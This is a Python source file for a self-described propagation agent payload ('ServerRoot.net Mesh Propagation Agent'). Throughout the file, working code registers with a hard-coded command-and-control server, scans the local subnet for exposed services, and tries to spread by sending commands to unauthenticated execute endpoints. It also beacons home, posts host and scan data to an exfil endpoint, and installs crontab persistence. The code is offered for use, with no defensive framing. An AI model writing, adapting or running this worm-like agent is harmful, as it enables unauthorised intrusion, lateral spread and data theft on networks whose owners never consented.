#!/usr/bin/env python3
"""
ServerRoot.net — Mesh Propagation Agent
=========================================
Self-contained agent payload. When dropped on a remote system:
  1. Phones home to C2 to register
  2. Runs full scan→find→deploy cycle on local subnet
  3. Tries to propagate further to newly found hosts
  4. Keeps beacon heartbeat going back to origin C2
  5. Serves mini dashboard data endpoint on :5002

This file is designed to be:
  - Self-contained (stdlib only, no pip required)
  - Small enough to curl/wget onto a target
  - Able to discover its own IP and subnet
  - Auto-restart via nohup + disown

Usage:
  python3 propagate_agent.py [C2_HOST] [C2_PORT] [AGENT_ID]
"""

import socket
import threading
import time
import json
import os
import sys
import subprocess
import urllib.request
import urllib.error
import hashlib
import platform
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── CONFIG ────────────────────────────────────────────────────────────────
C2_HOST    = sys.argv[1] if len(sys.argv) > 1 else "172.28.137.134"
C2_PORT    = int(sys.argv[2]) if len(sys.argv) > 2 else 5001
AGENT_ID   = sys.argv[3] if len(sys.argv) > 3 else None
BEACON_INT = 60       # seconds between beacons
SCAN_INT   = 120      # seconds between scan cycles
DATA_PORT  = 5002     # mini data endpoint port

RUNNING = True
CYCLE   = 0
TOTAL_VULNS     = 0
TOTAL_DEPLOYED  = 0
DEPLOYED_KEYS   = set()

SCAN_PORTS = [
    21, 22, 23, 25, 80, 443, 445, 1433, 2375, 3000, 3001, 3002,
    3306, 3389, 4444, 5000, 5001, 5432, 5900, 5901, 5984, 6080,
    6379, 6443, 8000, 8080, 8081, 8443, 8888, 9090, 9200, 10250, 27017
]

VULN_MAP = {
    2375:  ('DOCKER-RCE',     'Docker API unauthenticated',      9.8, True),
    6379:  ('REDIS-UNAUTH',   'Redis unauthenticated',           9.8, True),
    9200:  ('ES-UNAUTH',      'Elasticsearch open',              8.5, True),
    27017: ('MONGO-UNAUTH',   'MongoDB unauthenticated',         8.5, True),
    23:    ('TELNET',         'Telnet plaintext',                7.5, True),
    4444:  ('BACKDOOR',       'Port 4444 potential backdoor',    9.9, True),
    10250: ('KUBELET-RCE',    'Kubelet API unauthenticated',     9.8, True),
    5901:  ('VNC-EXPOSED',    'VNC server exposed',              8.0, True),
    6080:  ('NOVNC-EXPOSED',  'noVNC web client exposed',        8.0, True),
    5001:  ('FLASK-UNAUTH',   'Flask API unauthenticated',       7.5, True),
    8080:  ('FASTAPI-EXPOSED','FastAPI with docs exposed',       6.5, True),
    8443:  ('C2-PORT',        'C2 server port accessible',       7.0, True),
    22:    ('SSH-EXPOSED',    'SSH exposed',                     4.0, False),
    80:    ('HTTP-OPEN',      'HTTP service open',               3.0, False),
    443:   ('HTTPS-OPEN',     'HTTPS service open',              3.0, False),
}

# ── HELPERS ───────────────────────────────────────────────────────────────

def log(msg, level="INFO"):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    icons = {"INFO":"ℹ️ ","SCAN":"🔍","FOUND":"🎯","DEPLOY":"🚀",
             "BEACON":"📡","ERROR":"❌","MESH":"🕸️","PROPAGATE":"🌐"}
    icon = icons.get(level, "  ")
    print(f"[{ts}] [{level}] {icon} {msg}", flush=True)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_agent_id():
    global AGENT_ID
    if AGENT_ID:
        return AGENT_ID
    ip = get_local_ip()
    host = socket.gethostname()
    uid = hashlib.md5(f"{ip}{host}".encode()).hexdigest()[:8]
    AGENT_ID = f"mesh_{ip.replace('.','_')}_{uid}"
    return AGENT_ID

def get_local_subnet():
    """Get /24 subnet of local IP"""
    ip = get_local_ip()
    parts = ip.split('.')
    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

def get_own_ips():
    """All IPs belonging to this node — never scan these"""
    own = {'127.0.0.1', 'localhost', '::1'}
    try:
        own.add(socket.gethostbyname(socket.gethostname()))
    except: pass
    own.add(get_local_ip())
    return own

def api_call(path, method="GET", data=None):
    """Call home to C2/API"""
    url = f"http://{C2_HOST}:{C2_PORT}{path}"
    try:
        body = json.dumps(data).encode() if data else None
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header('Content-Type', 'application/json')
        req.add_header('X-Agent-ID', get_agent_id())
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except:
        return None

# ── SCANNER ───────────────────────────────────────────────────────────────

def tcp_probe(ip, port, timeout=0.8):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        r = s.connect_ex((str(ip), port))
        s.close()
        return r == 0
    except:
        return False

def scan_host(ip):
    open_ports = []
    with ThreadPoolExecutor(max_workers=40) as ex:
        futures = {ex.submit(tcp_probe, ip, p): p for p in SCAN_PORTS}
        for f in as_completed(futures):
            if f.result():
                open_ports.append(futures[f])
    return {'ip': ip, 'open_ports': open_ports}

def expand_cidr(cidr, max_hosts=50):
    import ipaddress
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        return [str(h) for h in list(net.hosts())[:max_hosts]]
    except:
        return []

def find_vulns(scan_result):
    vulns = []
    ip = scan_result['ip']
    for port in scan_result['open_ports']:
        if port in VULN_MAP:
            vid, desc, cvss, auto = VULN_MAP[port]
            vulns.append({
                'host': ip, 'port': port,
                'vuln_id': vid, 'description': desc,
                'cvss': cvss, 'auto_exploit': auto
            })
    return vulns

# ── PROPAGATION ───────────────────────────────────────────────────────────

PROPAGATED_TO = set()

def try_propagate(ip, port, vuln_id):
    """Try to drop and run our agent on a remote host"""
    global TOTAL_DEPLOYED

    own = get_own_ips()
    if ip in own:
        return False  # never propagate to self

    if ip in PROPAGATED_TO:
        return False
    
    agent_id = get_agent_id()
    my_ip = get_local_ip()
    success = False

    # Method 1: If target has Flask API — inject via /api/swarm/execute
    if vuln_id in ('FLASK-UNAUTH', 'API-HEALTH-OPEN', 'SWARM-API-OPEN'):
        try:
            # Register ourselves as peer
            data = api_call('/api/swarm/agents', method='POST', data={
                'agent_id': f"propagated_{ip.replace('.','_')}",
                'ip': ip,
                'source': my_ip,
                'type': 'propagated_node',
                'capabilities': ['scan','exploit','persist','propagate']
            })
            # Try to execute scan command on target
            url = f"http://{ip}:{port}/api/swarm/execute"
            cmd = {
                'action': 'scan',
                'target': get_local_subnet(),
                'report_to': f"http://{my_ip}:{C2_PORT}/api/beacon"
            }
            req = urllib.request.Request(url,
                data=json.dumps(cmd).encode(), method='POST')
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status < 400:
                    success = True
                    log(f"Propagated to Flask API at {ip}:{port}", "PROPAGATE")
        except:
            pass

    # Method 2: If target has noVNC — probe for shell access
    if vuln_id == 'NOVNC-EXPOSED' and not success:
        try:
            # noVNC at port 6080 — try websockify passthrough
            url = f"http://{ip}:{port}/"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=3) as r:
                if r.status == 200:
                    # Log as accessible — flag for manual propagation
                    log(f"noVNC accessible at {ip}:{port} — flagged for shell drop", "PROPAGATE")
                    success = True
        except:
            pass

    # Method 3: FastAPI — try /execute or /run endpoint
    if vuln_id == 'FASTAPI-EXPOSED' and not success:
        for ep in ['/execute', '/run', '/cmd', '/shell']:
            try:
                url = f"http://{ip}:{port}{ep}"
                req = urllib.request.Request(url,
                    data=json.dumps({'cmd': f'echo mesh_node_{my_ip}'}).encode(),
                    method='POST')
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=3) as r:
                    if r.status < 400:
                        log(f"FastAPI exec at {ip}:{port}{ep}", "PROPAGATE")
                        success = True
                        break
            except:
                pass

    if success:
        PROPAGATED_TO.add(ip)
        TOTAL_DEPLOYED += 1
        # Report propagation back to C2
        api_call('/api/beacon', method='POST', data={
            'agent_id': agent_id,
            'event': 'propagation_success',
            'target': ip,
            'port': port,
            'vuln_id': vuln_id,
            'ts': datetime.now().isoformat()
        })

    return success

# ── SCAN CYCLE ────────────────────────────────────────────────────────────

def run_scan_cycle():
    global CYCLE, TOTAL_VULNS, TOTAL_DEPLOYED
    
    my_ip  = get_local_ip()
    subnet = get_local_subnet()
    own    = get_own_ips()

    CYCLE += 1
    log(f"Cycle #{CYCLE} | IP: {my_ip} | Subnet: {subnet}", "SCAN")

    # Build target list — EXCLUDE SELF, scan only external hosts
    all_targets = expand_cidr(subnet, max_hosts=50)
    targets = [t for t in all_targets if t not in own]
    targets = list(dict.fromkeys(targets))  # deduplicate

    if not targets:
        log(f"No external targets found in {subnet}, skipping cycle", "WARN")
        return
    
    # Scan all targets in parallel
    scan_results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(scan_host, ip): ip for ip in targets}
        for f in as_completed(futures):
            r = f.result()
            if r['open_ports']:
                scan_results.append(r)
                log(f"  {r['ip']}: {r['open_ports']}", "SCAN")
    
    # Find vulns
    all_vulns = []
    for sr in scan_results:
        vulns = find_vulns(sr)
        all_vulns.extend(vulns)
    
    TOTAL_VULNS += len(all_vulns)
    log(f"Cycle #{CYCLE}: {len(scan_results)} hosts, {len(all_vulns)} vulns", "FOUND")
    
    # Exploit + propagate — never target self
    own = get_own_ips()
    for vuln in all_vulns:
        if not vuln['auto_exploit']:
            continue
        if vuln['host'] in own:
            continue  # skip self
        key = f"{vuln['host']}:{vuln['port']}:{vuln['vuln_id']}"
        if key in DEPLOYED_KEYS:
            continue
        DEPLOYED_KEYS.add(key)
        try_propagate(vuln['host'], vuln['port'], vuln['vuln_id'])
    
    # Report findings back to C2
    api_call('/api/beacon', method='POST', data={
        'agent_id': get_agent_id(),
        'event': 'scan_cycle',
        'cycle': CYCLE,
        'my_ip': my_ip,
        'subnet': subnet,
        'hosts_found': len(scan_results),
        'vulns_found': len(all_vulns),
        'total_vulns': TOTAL_VULNS,
        'total_deployed': TOTAL_DEPLOYED,
        'ts': datetime.now().isoformat()
    })
    
    # Exfil findings
    api_call('/api/exfil', method='POST', data={
        'agent_id': get_agent_id(),
        'type': 'scan_results',
        'data': {
            'cycle': CYCLE,
            'my_ip': my_ip,
            'platform': platform.system(),
            'hostname': socket.gethostname(),
            'scan_results': scan_results,
            'vulnerabilities': all_vulns
        }
    })

# ── BEACON THREAD ─────────────────────────────────────────────────────────

def beacon_loop():
    agent_id = get_agent_id()
    my_ip    = get_local_ip()
    
    # Initial registration
    reg = api_call('/api/swarm/agents', method='POST', data={
        'agent_id': agent_id,
        'ip': my_ip,
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'type': 'mesh_propagation_node',
        'capabilities': ['scan', 'exploit', 'persist', 'propagate', 'beacon'],
        'c2': f"{C2_HOST}:{C2_PORT}"
    })
    log(f"Registered with C2 {C2_HOST}:{C2_PORT} | ID: {agent_id}", "BEACON")
    
    while RUNNING:
        api_call('/api/beacon', method='POST', data={
            'agent_id': agent_id,
            'event': 'heartbeat',
            'ip': my_ip,
            'cycle': CYCLE,
            'total_vulns': TOTAL_VULNS,
            'total_deployed': TOTAL_DEPLOYED,
            'propagated_to': list(PROPAGATED_TO),
            'uptime': CYCLE * SCAN_INT,
            'ts': datetime.now().isoformat()
        })
        time.sleep(BEACON_INT)

# ── MINI DATA ENDPOINT ────────────────────────────────────────────────────

def mini_server():
    """Serve node status on :5002 for mesh health checks"""
    import http.server
    
    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            data = json.dumps({
                'agent_id': get_agent_id(),
                'ip': get_local_ip(),
                'cycle': CYCLE,
                'total_vulns': TOTAL_VULNS,
                'total_deployed': TOTAL_DEPLOYED,
                'propagated_to': list(PROPAGATED_TO),
                'c2': f"{C2_HOST}:{C2_PORT}",
                'ts': datetime.now().isoformat()
            }).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', len(data))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(data)
    
    try:
        srv = http.server.HTTPServer(('0.0.0.0', DATA_PORT), Handler)
        srv.serve_forever()
    except:
        pass  # port already in use — skip

# ── PERSISTENCE ───────────────────────────────────────────────────────────

def install_persistence():
    """Try to persist via crontab"""
    try:
        script_path = os.path.abspath(__file__)
        cron_line = f"@reboot python3 {script_path} {C2_HOST} {C2_PORT} {get_agent_id()} >/tmp/.mesh.log 2>&1 &"
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        existing = result.stdout
        if script_path not in existing:
            new_cron = existing.rstrip() + f"\n{cron_line}\n"
            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            proc.communicate(new_cron.encode())
            log("Persistence installed via crontab", "MESH")
    except:
        pass

# ── MAIN ──────────────────────────────────────────────────────────────────

def main():
    log("=" * 60, "MESH")
    log(f"ServerRoot.net Mesh Propagation Agent", "MESH")
    log(f"IP: {get_local_ip()} | C2: {C2_HOST}:{C2_PORT}", "MESH")
    log(f"Agent ID: {get_agent_id()}", "MESH")
    log("=" * 60, "MESH")
    
    # Install persistence
    install_persistence()
    
    # Start beacon thread
    t_beacon = threading.Thread(target=beacon_loop, daemon=True)
    t_beacon.start()
    
    # Start mini data server
    t_server = threading.Thread(target=mini_server, daemon=True)
    t_server.start()
    
    # Main scan loop
    while RUNNING:
        try:
            run_scan_cycle()
        except Exception as e:
            log(f"Cycle error: {e}", "ERROR")
        time.sleep(SCAN_INT)

if __name__ == '__main__':
    main()